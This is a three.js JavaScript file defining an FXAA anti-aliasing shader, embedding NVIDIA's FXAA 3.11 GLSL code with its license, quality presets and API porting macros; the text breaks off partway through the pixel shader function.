/**
 * @author alteredq / http://alteredqualia.com/
 * @author davidedc / http://www.sketchpatch.net/
 *
 * NVIDIA FXAA by Timothy Lottes
 * http://timothylottes.blogspot.com/2011/06/fxaa3-source-released.html
 * - WebGL port by @supereggbert
 * http://www.glge.org/demos/fxaa/
 */

THREE.FXAAShader = {

	uniforms: {

		"tDiffuse": { value: null },
		"resolution": { value: new THREE.Vector2( 1 / 1024, 1 / 512 ) }

	},

	vertexShader: [

		"varying vec2 vUv;",

		"void main() {",

		"	vUv = uv;",
		"	gl_Position = projectionMatrix * modelViewMatrix * vec4( position, 1.0 );",

		"}"

	].join( "\n" ),

	fragmentShader: [
		"precision highp float;",
		"",
		"uniform sampler2D tDiffuse;",
		"",
		"uniform vec2 resolution;",
		"",
		"varying vec2 vUv;",
		"",
		"// FXAA 3.11 implementation by NVIDIA, ported to WebGL by Agost Biro (biro@archilogic.com)",
		"",
		"//----------------------------------------------------------------------------------",
		"// File:        es3-kepler\FXAA\assets\shaders/FXAA_DefaultES.frag",
		"// SDK Version: v3.00",
		"// Email:       gameworks@nvidia.com",
		"// Site:        http://developer.nvidia.com/",
		"//",
		"// Copyright (c) 2014-2015, NVIDIA CORPORATION. All rights reserved.",
		"//",
		"// Redistribution and use in source and binary forms, with or without",
		"// modification, are permitted provided that the following conditions",
		"// are met:",
		"//  * Redistributions of source code must retain the above copyright",
		"//    notice, this list of conditions and the following disclaimer.",
		"//  * Redistributions in binary form must reproduce the above copyright",
		"//    notice, this list of conditions and the following disclaimer in the",
		"//    documentation and/or other materials provided with the distribution.",
		"//  * Neither the name of NVIDIA CORPORATION nor the names of its",
		"//    contributors may be used to endorse or promote products derived",
		"//    from this software without specific prior written permission.",
		"//",
		"// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS ``AS IS'' AND ANY",
		"// EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE",
		"// IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR",
		"// PURPOSE ARE DISCLAIMED.  IN NO EVENT SHALL THE COPYRIGHT OWNER OR",
		"// CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,",
		"// EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,",
		"// PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR",
		"// PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY",
		"// OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT",
		"// (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE",
		"// OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.",
		"//",
		"//----------------------------------------------------------------------------------",
		"",
		"#define FXAA_PC 1",
		"#define FXAA_GLSL_100 1",
		"#define FXAA_QUALITY_PRESET 12",
		"",
		"#define FXAA_GREEN_AS_LUMA 1",
		"",
		"/*--------------------------------------------------------------------------*/",
		"#ifndef FXAA_PC_CONSOLE",
		"    //",
		"    // The console algorithm for PC is included",
		"    // for developers targeting really low spec machines.",
		"    // Likely better to just run FXAA_PC, and use a really low preset.",
		"    //",
		"    #define FXAA_PC_CONSOLE 0",
		"#endif",
		"/*--------------------------------------------------------------------------*/",
		"#ifndef FXAA_GLSL_120",
		"    #define FXAA_GLSL_120 0",
		"#endif",
		"/*--------------------------------------------------------------------------*/",
		"#ifndef FXAA_GLSL_130",
		"    #define FXAA_GLSL_130 0",
		"#endif",
		"/*--------------------------------------------------------------------------*/",
		"#ifndef FXAA_HLSL_3",
		"    #define FXAA_HLSL_3 0",
		"#endif",
		"/*--------------------------------------------------------------------------*/",
		"#ifndef FXAA_HLSL_4",
		"    #define FXAA_HLSL_4 0",
		"#endif",
		"/*--------------------------------------------------------------------------*/",
		"#ifndef FXAA_HLSL_5",
		"    #define FXAA_HLSL_5 0",
		"#endif",
		"/*==========================================================================*/",
		"#ifndef FXAA_GREEN_AS_LUMA",
		"    //",
		"    // For those using non-linear color,",
		"    // and either not able to get luma in alpha, or not wanting to,",
		"    // this enables FXAA to run using green as a proxy for luma.",
		"    // So with this enabled, no need to pack luma in alpha.",
		"    //",
		"    // This will turn off AA on anything which lacks some amount of green.",
		"    // Pure red and blue or combination of only R and B, will get no AA.",
		"    //",
		"    // Might want to lower the settings for both,",
		"    //    fxaaConsoleEdgeThresholdMin",
		"    //    fxaaQualityEdgeThresholdMin",
		"    // In order to insure AA does not get turned off on colors",
		"    // which contain a minor amount of green.",
		"    //",
		"    // 1 = On.",
		"    // 0 = Off.",
		"    //",
		"    #define FXAA_GREEN_AS_LUMA 0",
		"#endif",
		"/*--------------------------------------------------------------------------*/",
		"#ifndef FXAA_EARLY_EXIT",
		"    //",
		"    // Controls algorithm's early exit path.",
		"    // On PS3 turning this ON adds 2 cycles to the shader.",
		"    // On 360 turning this OFF adds 10ths of a millisecond to the shader.",
		"    // Turning this off on console will result in a more blurry image.",
		"    // So this defaults to on.",
		"    //",
		"    // 1 = On.",
		"    // 0 = Off.",
		"    //",
		"    #define FXAA_EARLY_EXIT 1",
		"#endif",
		"/*--------------------------------------------------------------------------*/",
		"#ifndef FXAA_DISCARD",
		"    //",
		"    // Only valid for PC OpenGL currently.",
		"    // Probably will not work when FXAA_GREEN_AS_LUMA = 1.",
		"    //",
		"    // 1 = Use discard on pixels which don't need AA.",
		"    //     For APIs which enable concurrent TEX+ROP from same surface.",
		"    // 0 = Return unchanged color on pixels which don't need AA.",
		"    //",
		"    #define FXAA_DISCARD 0",
		"#endif",
		"/*--------------------------------------------------------------------------*/",
		"#ifndef FXAA_FAST_PIXEL_OFFSET",
		"    //",
		"    // Used for GLSL 120 only.",
		"    //",
		"    // 1 = GL API supports fast pixel offsets",
		"    // 0 = do not use fast pixel offsets",
		"    //",
		"    #ifdef GL_EXT_gpu_shader4",
		"        #define FXAA_FAST_PIXEL_OFFSET 1",
		"    #endif",
		"    #ifdef GL_NV_gpu_shader5",
		"        #define FXAA_FAST_PIXEL_OFFSET 1",
		"    #endif",
		"    #ifdef GL_ARB_gpu_shader5",
		"        #define FXAA_FAST_PIXEL_OFFSET 1",
		"    #endif",
		"    #ifndef FXAA_FAST_PIXEL_OFFSET",
		"        #define FXAA_FAST_PIXEL_OFFSET 0",
		"    #endif",
		"#endif",
		"/*--------------------------------------------------------------------------*/",
		"#ifndef FXAA_GATHER4_ALPHA",
		"    //",
		"    // 1 = API supports gather4 on alpha channel.",
		"    // 0 = API does not support gather4 on alpha channel.",
		"    //",
		"    #if (FXAA_HLSL_5 == 1)",
		"        #define FXAA_GATHER4_ALPHA 1",
		"    #endif",
		"    #ifdef GL_ARB_gpu_shader5",
		"        #define FXAA_GATHER4_ALPHA 1",
		"    #endif",
		"    #ifdef GL_NV_gpu_shader5",
		"        #define FXAA_GATHER4_ALPHA 1",
		"    #endif",
		"    #ifndef FXAA_GATHER4_ALPHA",
		"        #define FXAA_GATHER4_ALPHA 0",
		"    #endif",
		"#endif",
		"",
		"",
		"/*============================================================================",
		"                        FXAA QUALITY - TUNING KNOBS",
		"------------------------------------------------------------------------------",
		"NOTE the other tuning knobs are now in the shader function inputs!",
		"============================================================================*/",
		"#ifndef FXAA_QUALITY_PRESET",
		"    //",
		"    // Choose the quality preset.",
		"    // This needs to be compiled into the shader as it effects code.",
		"    // Best option to include multiple presets is to",
		"    // in each shader define the preset, then include this file.",
		"    //",
		"    // OPTIONS",
		"    // -----------------------------------------------------------------------",
		"    // 10 to 15 - default medium dither (10=fastest, 15=highest quality)",
		"    // 20 to 29 - less dither, more expensive (20=fastest, 29=highest quality)",
		"    // 39       - no dither, very expensive",
		"    //",
		"    // NOTES",
		"    // -----------------------------------------------------------------------",
		"    // 12 = slightly faster then FXAA 3.9 and higher edge quality (default)",
		"    // 13 = about same speed as FXAA 3.9 and better than 12",
		"    // 23 = closest to FXAA 3.9 visually and performance wise",
		"    //  _ = the lowest digit is directly related to performance",
		"    // _  = the highest digit is directly related to style",
		"    //",
		"    #define FXAA_QUALITY_PRESET 12",
		"#endif",
		"",
		"",
		"/*============================================================================",
		"",
		"                           FXAA QUALITY - PRESETS",
		"",
		"============================================================================*/",
		"",
		"/*============================================================================",
		"                     FXAA QUALITY - MEDIUM DITHER PRESETS",
		"============================================================================*/",
		"#if (FXAA_QUALITY_PRESET == 10)",
		"    #define FXAA_QUALITY_PS 3",
		"    #define FXAA_QUALITY_P0 1.5",
		"    #define FXAA_QUALITY_P1 3.0",
		"    #define FXAA_QUALITY_P2 12.0",
		"#endif",
		"/*--------------------------------------------------------------------------*/",
		"#if (FXAA_QUALITY_PRESET == 11)",
		"    #define FXAA_QUALITY_PS 4",
		"    #define FXAA_QUALITY_P0 1.0",
		"    #define FXAA_QUALITY_P1 1.5",
		"    #define FXAA_QUALITY_P2 3.0",
		"    #define FXAA_QUALITY_P3 12.0",
		"#endif",
		"/*--------------------------------------------------------------------------*/",
		"#if (FXAA_QUALITY_PRESET == 12)",
		"    #define FXAA_QUALITY_PS 5",
		"    #define FXAA_QUALITY_P0 1.0",
		"    #define FXAA_QUALITY_P1 1.5",
		"    #define FXAA_QUALITY_P2 2.0",
		"    #define FXAA_QUALITY_P3 4.0",
		"    #define FXAA_QUALITY_P4 12.0",
		"#endif",
		"/*--------------------------------------------------------------------------*/",
		"#if (FXAA_QUALITY_PRESET == 13)",
		"    #define FXAA_QUALITY_PS 6",
		"    #define FXAA_QUALITY_P0 1.0",
		"    #define FXAA_QUALITY_P1 1.5",
		"    #define FXAA_QUALITY_P2 2.0",
		"    #define FXAA_QUALITY_P3 2.0",
		"    #define FXAA_QUALITY_P4 4.0",
		"    #define FXAA_QUALITY_P5 12.0",
		"#endif",
		"/*--------------------------------------------------------------------------*/",
		"#if (FXAA_QUALITY_PRESET == 14)",
		"    #define FXAA_QUALITY_PS 7",
		"    #define FXAA_QUALITY_P0 1.0",
		"    #define FXAA_QUALITY_P1 1.5",
		"    #define FXAA_QUALITY_P2 2.0",
		"    #define FXAA_QUALITY_P3 2.0",
		"    #define FXAA_QUALITY_P4 2.0",
		"    #define FXAA_QUALITY_P5 4.0",
		"    #define FXAA_QUALITY_P6 12.0",
		"#endif",
		"/*--------------------------------------------------------------------------*/",
		"#if (FXAA_QUALITY_PRESET == 15)",
		"    #define FXAA_QUALITY_PS 8",
		"    #define FXAA_QUALITY_P0 1.0",
		"    #define FXAA_QUALITY_P1 1.5",
		"    #define FXAA_QUALITY_P2 2.0",
		"    #define FXAA_QUALITY_P3 2.0",
		"    #define FXAA_QUALITY_P4 2.0",
		"    #define FXAA_QUALITY_P5 2.0",
		"    #define FXAA_QUALITY_P6 4.0",
		"    #define FXAA_QUALITY_P7 12.0",
		"#endif",
		"",
		"/*============================================================================",
		"                     FXAA QUALITY - LOW DITHER PRESETS",
		"============================================================================*/",
		"#if (FXAA_QUALITY_PRESET == 20)",
		"    #define FXAA_QUALITY_PS 3",
		"    #define FXAA_QUALITY_P0 1.5",
		"    #define FXAA_QUALITY_P1 2.0",
		"    #define FXAA_QUALITY_P2 8.0",
		"#endif",
		"/*--------------------------------------------------------------------------*/",
		"#if (FXAA_QUALITY_PRESET == 21)",
		"    #define FXAA_QUALITY_PS 4",
		"    #define FXAA_QUALITY_P0 1.0",
		"    #define FXAA_QUALITY_P1 1.5",
		"    #define FXAA_QUALITY_P2 2.0",
		"    #define FXAA_QUALITY_P3 8.0",
		"#endif",
		"/*--------------------------------------------------------------------------*/",
		"#if (FXAA_QUALITY_PRESET == 22)",
		"    #define FXAA_QUALITY_PS 5",
		"    #define FXAA_QUALITY_P0 1.0",
		"    #define FXAA_QUALITY_P1 1.5",
		"    #define FXAA_QUALITY_P2 2.0",
		"    #define FXAA_QUALITY_P3 2.0",
		"    #define FXAA_QUALITY_P4 8.0",
		"#endif",
		"/*--------------------------------------------------------------------------*/",
		"#if (FXAA_QUALITY_PRESET == 23)",
		"    #define FXAA_QUALITY_PS 6",
		"    #define FXAA_QUALITY_P0 1.0",
		"    #define FXAA_QUALITY_P1 1.5",
		"    #define FXAA_QUALITY_P2 2.0",
		"    #define FXAA_QUALITY_P3 2.0",
		"    #define FXAA_QUALITY_P4 2.0",
		"    #define FXAA_QUALITY_P5 8.0",
		"#endif",
		"/*--------------------------------------------------------------------------*/",
		"#if (FXAA_QUALITY_PRESET == 24)",
		"    #define FXAA_QUALITY_PS 7",
		"    #define FXAA_QUALITY_P0 1.0",
		"    #define FXAA_QUALITY_P1 1.5",
		"    #define FXAA_QUALITY_P2 2.0",
		"    #define FXAA_QUALITY_P3 2.0",
		"    #define FXAA_QUALITY_P4 2.0",
		"    #define FXAA_QUALITY_P5 3.0",
		"    #define FXAA_QUALITY_P6 8.0",
		"#endif",
		"/*--------------------------------------------------------------------------*/",
		"#if (FXAA_QUALITY_PRESET == 25)",
		"    #define FXAA_QUALITY_PS 8",
		"    #define FXAA_QUALITY_P0 1.0",
		"    #define FXAA_QUALITY_P1 1.5",
		"    #define FXAA_QUALITY_P2 2.0",
		"    #define FXAA_QUALITY_P3 2.0",
		"    #define FXAA_QUALITY_P4 2.0",
		"    #define FXAA_QUALITY_P5 2.0",
		"    #define FXAA_QUALITY_P6 4.0",
		"    #define FXAA_QUALITY_P7 8.0",
		"#endif",
		"/*--------------------------------------------------------------------------*/",
		"#if (FXAA_QUALITY_PRESET == 26)",
		"    #define FXAA_QUALITY_PS 9",
		"    #define FXAA_QUALITY_P0 1.0",
		"    #define FXAA_QUALITY_P1 1.5",
		"    #define FXAA_QUALITY_P2 2.0",
		"    #define FXAA_QUALITY_P3 2.0",
		"    #define FXAA_QUALITY_P4 2.0",
		"    #define FXAA_QUALITY_P5 2.0",
		"    #define FXAA_QUALITY_P6 2.0",
		"    #define FXAA_QUALITY_P7 4.0",
		"    #define FXAA_QUALITY_P8 8.0",
		"#endif",
		"/*--------------------------------------------------------------------------*/",
		"#if (FXAA_QUALITY_PRESET == 27)",
		"    #define FXAA_QUALITY_PS 10",
		"    #define FXAA_QUALITY_P0 1.0",
		"    #define FXAA_QUALITY_P1 1.5",
		"    #define FXAA_QUALITY_P2 2.0",
		"    #define FXAA_QUALITY_P3 2.0",
		"    #define FXAA_QUALITY_P4 2.0",
		"    #define FXAA_QUALITY_P5 2.0",
		"    #define FXAA_QUALITY_P6 2.0",
		"    #define FXAA_QUALITY_P7 2.0",
		"    #define FXAA_QUALITY_P8 4.0",
		"    #define FXAA_QUALITY_P9 8.0",
		"#endif",
		"/*--------------------------------------------------------------------------*/",
		"#if (FXAA_QUALITY_PRESET == 28)",
		"    #define FXAA_QUALITY_PS 11",
		"    #define FXAA_QUALITY_P0 1.0",
		"    #define FXAA_QUALITY_P1 1.5",
		"    #define FXAA_QUALITY_P2 2.0",
		"    #define FXAA_QUALITY_P3 2.0",
		"    #define FXAA_QUALITY_P4 2.0",
		"    #define FXAA_QUALITY_P5 2.0",
		"    #define FXAA_QUALITY_P6 2.0",
		"    #define FXAA_QUALITY_P7 2.0",
		"    #define FXAA_QUALITY_P8 2.0",
		"    #define FXAA_QUALITY_P9 4.0",
		"    #define FXAA_QUALITY_P10 8.0",
		"#endif",
		"/*--------------------------------------------------------------------------*/",
		"#if (FXAA_QUALITY_PRESET == 29)",
		"    #define FXAA_QUALITY_PS 12",
		"    #define FXAA_QUALITY_P0 1.0",
		"    #define FXAA_QUALITY_P1 1.5",
		"    #define FXAA_QUALITY_P2 2.0",
		"    #define FXAA_QUALITY_P3 2.0",
		"    #define FXAA_QUALITY_P4 2.0",
		"    #define FXAA_QUALITY_P5 2.0",
		"    #define FXAA_QUALITY_P6 2.0",
		"    #define FXAA_QUALITY_P7 2.0",
		"    #define FXAA_QUALITY_P8 2.0",
		"    #define FXAA_QUALITY_P9 2.0",
		"    #define FXAA_QUALITY_P10 4.0",
		"    #define FXAA_QUALITY_P11 8.0",
		"#endif",
		"",
		"/*============================================================================",
		"                     FXAA QUALITY - EXTREME QUALITY",
		"============================================================================*/",
		"#if (FXAA_QUALITY_PRESET == 39)",
		"    #define FXAA_QUALITY_PS 12",
		"    #define FXAA_QUALITY_P0 1.0",
		"    #define FXAA_QUALITY_P1 1.0",
		"    #define FXAA_QUALITY_P2 1.0",
		"    #define FXAA_QUALITY_P3 1.0",
		"    #define FXAA_QUALITY_P4 1.0",
		"    #define FXAA_QUALITY_P5 1.5",
		"    #define FXAA_QUALITY_P6 2.0",
		"    #define FXAA_QUALITY_P7 2.0",
		"    #define FXAA_QUALITY_P8 2.0",
		"    #define FXAA_QUALITY_P9 2.0",
		"    #define FXAA_QUALITY_P10 4.0",
		"    #define FXAA_QUALITY_P11 8.0",
		"#endif",
		"",
		"",
		"",
		"/*============================================================================",
		"",
		"                                API PORTING",
		"",
		"============================================================================*/",
		"#if (FXAA_GLSL_100 == 1) || (FXAA_GLSL_120 == 1) || (FXAA_GLSL_130 == 1)",
		"    #define FxaaBool bool",
		"    #define FxaaDiscard discard",
		"    #define FxaaFloat float",
		"    #define FxaaFloat2 vec2",
		"    #define FxaaFloat3 vec3",
		"    #define FxaaFloat4 vec4",
		"    #define FxaaHalf float",
		"    #define FxaaHalf2 vec2",
		"    #define FxaaHalf3 vec3",
		"    #define FxaaHalf4 vec4",
		"    #define FxaaInt2 ivec2",
		"    #define FxaaSat(x) clamp(x, 0.0, 1.0)",
		"    #define FxaaTex sampler2D",
		"#else",
		"    #define FxaaBool bool",
		"    #define FxaaDiscard clip(-1)",
		"    #define FxaaFloat float",
		"    #define FxaaFloat2 float2",
		"    #define FxaaFloat3 float3",
		"    #define FxaaFloat4 float4",
		"    #define FxaaHalf half",
		"    #define FxaaHalf2 half2",
		"    #define FxaaHalf3 half3",
		"    #define FxaaHalf4 half4",
		"    #define FxaaSat(x) saturate(x)",
		"#endif",
		"/*--------------------------------------------------------------------------*/",
		"#if (FXAA_GLSL_100 == 1)",
		"  #define FxaaTexTop(t, p) texture2D(t, p, 0.0)",
		"  #define FxaaTexOff(t, p, o, r) texture2D(t, p + (o * r), 0.0)",
		"#endif",
		"/*--------------------------------------------------------------------------*/",
		"#if (FXAA_GLSL_120 == 1)",
		"    // Requires,",
		"    //  #version 120",
		"    // And at least,",
		"    //  #extension GL_EXT_gpu_shader4 : enable",
		"    //  (or set FXAA_FAST_PIXEL_OFFSET 1 to work like DX9)",
		"    #define FxaaTexTop(t, p) texture2DLod(t, p, 0.0)",
		"    #if (FXAA_FAST_PIXEL_OFFSET == 1)",
		"        #define FxaaTexOff(t, p, o, r) texture2DLodOffset(t, p, 0.0, o)",
		"    #else",
		"        #define FxaaTexOff(t, p, o, r) texture2DLod(t, p + (o * r), 0.0)",
		"    #endif",
		"    #if (FXAA_GATHER4_ALPHA == 1)",
		"        // use #extension GL_ARB_gpu_shader5 : enable",
		"        #define FxaaTexAlpha4(t, p) textureGather(t, p, 3)",
		"        #define FxaaTexOffAlpha4(t, p, o) textureGatherOffset(t, p, o, 3)",
		"        #define FxaaTexGreen4(t, p) textureGather(t, p, 1)",
		"        #define FxaaTexOffGreen4(t, p, o) textureGatherOffset(t, p, o, 1)",
		"    #endif",
		"#endif",
		"/*--------------------------------------------------------------------------*/",
		"#if (FXAA_GLSL_130 == 1)",
		"    // Requires \"#version 130\" or better",
		"    #define FxaaTexTop(t, p) textureLod(t, p, 0.0)",
		"    #define FxaaTexOff(t, p, o, r) textureLodOffset(t, p, 0.0, o)",
		"    #if (FXAA_GATHER4_ALPHA == 1)",
		"        // use #extension GL_ARB_gpu_shader5 : enable",
		"        #define FxaaTexAlpha4(t, p) textureGather(t, p, 3)",
		"        #define FxaaTexOffAlpha4(t, p, o) textureGatherOffset(t, p, o, 3)",
		"        #define FxaaTexGreen4(t, p) textureGather(t, p, 1)",
		"        #define FxaaTexOffGreen4(t, p, o) textureGatherOffset(t, p, o, 1)",
		"    #endif",
		"#endif",
		"/*--------------------------------------------------------------------------*/",
		"#if (FXAA_HLSL_3 == 1)",
		"    #define FxaaInt2 float2",
		"    #define FxaaTex sampler2D",
		"    #define FxaaTexTop(t, p) tex2Dlod(t, float4(p, 0.0, 0.0))",
		"    #define FxaaTexOff(t, p, o, r) tex2Dlod(t, float4(p + (o * r), 0, 0))",
		"#endif",
		"/*--------------------------------------------------------------------------*/",
		"#if (FXAA_HLSL_4 == 1)",
		"    #define FxaaInt2 int2",
		"    struct FxaaTex { SamplerState smpl; Texture2D tex; };",
		"    #define FxaaTexTop(t, p) t.tex.SampleLevel(t.smpl, p, 0.0)",
		"    #define FxaaTexOff(t, p, o, r) t.tex.SampleLevel(t.smpl, p, 0.0, o)",
		"#endif",
		"/*--------------------------------------------------------------------------*/",
		"#if (FXAA_HLSL_5 == 1)",
		"    #define FxaaInt2 int2",
		"    struct FxaaTex { SamplerState smpl; Texture2D tex; };",
		"    #define FxaaTexTop(t, p) t.tex.SampleLevel(t.smpl, p, 0.0)",
		"    #define FxaaTexOff(t, p, o, r) t.tex.SampleLevel(t.smpl, p, 0.0, o)",
		"    #define FxaaTexAlpha4(t, p) t.tex.GatherAlpha(t.smpl, p)",
		"    #define FxaaTexOffAlpha4(t, p, o) t.tex.GatherAlpha(t.smpl, p, o)",
		"    #define FxaaTexGreen4(t, p) t.tex.GatherGreen(t.smpl, p)",
		"    #define FxaaTexOffGreen4(t, p, o) t.tex.GatherGreen(t.smpl, p, o)",
		"#endif",
		"",
		"",
		"/*============================================================================",
		"                   GREEN AS LUMA OPTION SUPPORT FUNCTION",
		"============================================================================*/",
		"#if (FXAA_GREEN_AS_LUMA == 0)",
		"    FxaaFloat FxaaLuma(FxaaFloat4 rgba) { return rgba.w; }",
		"#else",
		"    FxaaFloat FxaaLuma(FxaaFloat4 rgba) { return rgba.y; }",
		"#endif",
		"",
		"",
		"",
		"",
		"/*============================================================================",
		"",
		"                             FXAA3 QUALITY - PC",
		"",
		"============================================================================*/",
		"#if (FXAA_PC == 1)",
		"/*--------------------------------------------------------------------------*/",
		"FxaaFloat4 FxaaPixelShader(",
		"    //",
		"    // Use noperspective interpolation here (turn off perspective interpolation).",
		"    // {xy} = center of pixel",
		"    FxaaFloat2 pos,",
		"    //",
		"    // Used only for FXAA Console, and not used on the 360 version.",
		"    // Use noperspective interpolation here (turn off perspective interpolation).",
		"    // {xy_} = upper left of pixel",
		"    // {_zw} = lower right of pixel",
		"    FxaaFloat4 fxaaConsolePosPos,",
		"    //",
		"    // Input color texture.",
		"    // {rgb_} = color in linear or perceptual color space",
		"    // if (FXAA_GREEN_AS_LUMA == 0)",
		"    //     {__a} = luma in perceptual color space (not linear)",
		"    FxaaTex tex,",
		"    //",
		"    // Only used on the optimized 360 version of FXAA Console.",
		"    // For everything but 360, just use the same input here as for \"tex\".",
		"    // For 360, same texture, just alias with a 2nd sampler.",
		"    // This sampler needs to have an exponent bias of -1.",
		"    FxaaTex fxaaConsole360TexExpBiasNegOne,",
		"    //",
		"    // Only used on the optimized 360 version of FXAA Console.",
		"    // For everything but 360, just use the same input here as for \"tex\".",
		"    // For 360, same texture, just alias with a 3nd sampler.",
		"    // This sampler needs to have an exponent bias of -2.",
		"    FxaaTex fxaaConsole360TexExpBiasNegTwo,",
		"    //",
		"    // Only used on FXAA Quality.",
		"    // This must be from a constant/uniform.",
		"    // {x_} = 1.0/screenWidthInPixels",
		"    // {_y} = 1.0/screenHeightInPixels",
		"    FxaaFloat2 fxaaQualityRcpFrame,",
		"    //",
		"    // Only used on FXAA Console.",
		"    // This must be from a constant/uniform.",
		"    // This effects sub-pixel AA quality and inversely sharpness.",
		"    //   Where N ranges between,",
		"    //     N = 0.50 (default)",
		"    //     N = 0.33 (sharper)",
		"    // {x__} = -N/screenWidthInPixels",
		"    // {_y_} = -N/screenHeightInPixels",
		"    // {_z_} =  N/screenWidthInPixels",
		"    // {__w} =  N/screenHeightInPixels",
		"    FxaaFloat4 fxaaConsoleRcpFrameOpt,",
		"    //",
		"    // Only used on FXAA Console.",
		"    // Not used on 360, but used on PS3 and PC.",
		"    // This must be from a constant/uniform.",
		"    // {x__} = -2.0/screenWidthInPixels",
		"    // {_y_} = -2.0/screenHeightInPixels",
		"    // {_z_} =  2.0/screenWidthInPixels",
		"    // {__w} =  2.0/screenHeightInPixels",
		"    FxaaFloat4 fxaaConsoleRcpFrameOpt2,",
		"    //",
		"    // Only used on FXAA Console.",
		"    // Only used on 360 in place of fxaaConsoleRcpFrameOpt2.",
		"    // This must be from a constant/uniform.",
		"    // {x__} =  8.0/screenWidthInPixels",
		"    // {_y_} =  8.0/screenHeightInPixels",
		"    // {_z_} = -4.0/screenWidthInPixels",
		"    // {__w} = -4.0/screenHeightInPixels",
		"    FxaaFloat4 fxaaConsole360RcpFrameOpt2,",
		"    //",
		"    // Only used on FXAA Quality.",
		"    // This used to be the FXAA_QUALITY_SUBPIX define.",
		"    // It is here now to allow easier tuning.",
		"    // Choose the amount of sub-pixel aliasing removal.",
		"    // This can effect sharpness.",
		"    //   1.00 - upper limit (softer)",
		"    //   0.75 - default amount of filtering",
		"    //   0.50 - lower limit (sharper, less sub-pixel aliasing removal)",
		"    //   0.25 - almost off",
		"    //   0.00 - completely off",
		"    FxaaFloat fxaaQualitySubpix,",
		"    //",
		"    // Only used on FXAA Quality.",
		"    // This used to be the FXAA_QUALITY_EDGE_THRESHOLD define.",
		"    // It is here now to allow easier tuning.",
		"    // The minimum amount of local contrast required to apply algorithm.",
		"    //   0.333 - too little (faster)",
		"    //   0.250 - low quality",
		"    //   0.166 - default",
		"    //   0.125 - high quality",
		"    //   0.063 - overkill (slower)",
		"    FxaaFloat fxaaQualityEdgeThreshold,",
		"    //",
		"    // Only used on FXAA Quality.",
		"    // This used to be the FXAA_QUALITY_EDGE_THRESHOLD_MIN define.",
		"    // It is here now to allow easier tuning.",
		"    // Trims the algorithm from processing darks.",
		"    //   0.0833 - upper limit (default, the start of visible unfiltered edges)",
		"    //   0.0625 - high quality (faster)",
		"    //   0.0312 - visible limit (slower)",
		"    // Special notes when using FXAA_GREEN_AS_LUMA,",
		"    //   Likely want to set this to zero.",
		"    //   As colors that are mostly not-green",
		"    //   will appear very dark in the green channel!",
		"    //   Tune by looking at mostly non-green content,",
		"    //   then start at zero and increase until aliasing is a problem.",
		"    FxaaFloat fxaaQualityEdgeThresholdMin,",
		"    //",
		"    // Only used on FXAA Console.",
		"    // This used to be the FXAA_CONSOLE_EDGE_SHARPNESS define.",
		"    // It is here now to allow easier tuning.",
		"    // This does not effect PS3, as this needs to be compiled in.",
		"    //   Use FXAA_CONSOLE_PS3_EDGE_SHARPNESS for PS3.",
		"    //   Due to the PS3 being ALU bound,",
		"    //   there are only three safe values here: 2 and 4 and 8.",
		"    //   These options use the shaders ability to a free *|/ by 2|4|8.",
		"    // For all other platforms can be a non-power of two.",
		"    //   8.0 is sharper (default!!!)",
		"    //   4.0 is softer",
		"    //   2.0 is really soft (good only for vector graphics inputs)",
		"    FxaaFloat fxaaConsoleEdgeSharpness,",
		"    //",
		"    // Only used on FXAA Console.",
		"    // This used to be the FXAA_CONSOLE_EDGE_THRESHOLD define.",
		"    // It is here now to allow easier tuning.",
		"    // This does not effect PS3, as this needs to be compiled in.",
		"    //   Use FXAA_CONSOLE_PS3_EDGE_THRESHOLD for PS3.",
		"    //   Due to the PS3 being ALU bound,",
		"    //   there are only two safe values here: 1/4 and 1/8.",
		"    //   These options use the shaders ability to a free *|/ by 2|4|8.",
		"    // The console setting has a different mapping than the quality setting.",
		"    // Other platforms can use other values.",
		"    //   0.125 leaves less aliasing, but is softer (default!!!)",
		"    //   0.25 leaves more aliasing, and is sharper",
		"    FxaaFloat fxaaConsoleEdgeThreshold,",
		"    //",
		"    // Only used on FXAA Console.",
		"    // This used to be the FXAA_CONSOLE_EDGE_THRESHOLD_MIN define.",
		"    // It is here now to allow easier tuning.",
		"    // Trims the algorithm from processing darks.",
		"    // The console setting has a different mapping than the quality setting.",
		"    // This only applies when FXAA_EARLY_EXIT is 1.",
		"    // This does not apply to PS3,",
		"    // PS3 was simplified to avoid more shader instructions.",
		"    //   0.06 - faster but more aliasing in darks",
		"    //   0.05 - default",
		"    //   0.04 - slower and less aliasing in darks",
		"    // Special notes when using FXAA_GREEN_AS_LUMA,",
		"    //   Likely want to set this to zero.",
		"    //   As colors that are mostly not-green",
		"    //   will appear very dark in the green channel!",
		"    //   Tune by looking at mostly non-green content,",
		"    //   then start at zero and increase until aliasing is a problem.",
		"    FxaaFloat fxaaConsoleEdgeThresholdMin,",
		"    //",
		"    // Extra constants for 360 FXAA Console only.",
		"    // Use zeros or anything else for other platforms.",
		"    // These must be in physical constant registers and NOT immediates.",
		"    // Immediates will result in compiler un-optimizing.",
		"    // {xyzw} = float4(1.0, -1.0, 0.25, -0.25)",
		"    FxaaFloat4 fxaaConsole360ConstDir",
		") {",
		"/*--------------------------------------------------------------------------*/",
		"    FxaaFloat2 posM;",
		"    posM.x = pos.x;",
		"    posM.y = pos.y;",
		"    #if (FXAA_GATHER4_ALPHA == 1)",
		"        #if (FXAA_DISCARD == 0)",
		"            FxaaFloat4 rgbyM = FxaaTexTop(tex, posM);",
		"            #if (FXAA_GREEN_AS_LUMA == 0)",
		"                #define lumaM rgbyM.w",
		"            #else",
		"                #define lumaM rgbyM.y",
		"            #endif",
		"        #endif",
		"        #if (FXAA_GREEN_AS_LUMA == 0)",
		"            FxaaFloat4 luma4A = FxaaTexAlpha4(tex, posM);",
		"            FxaaFloat4 luma4B = FxaaTexOffAlpha4(tex, posM, FxaaInt2(-1, -1));",
		"        #else",
		"            FxaaFloat4 luma4A = FxaaTexGreen4(tex, posM);",
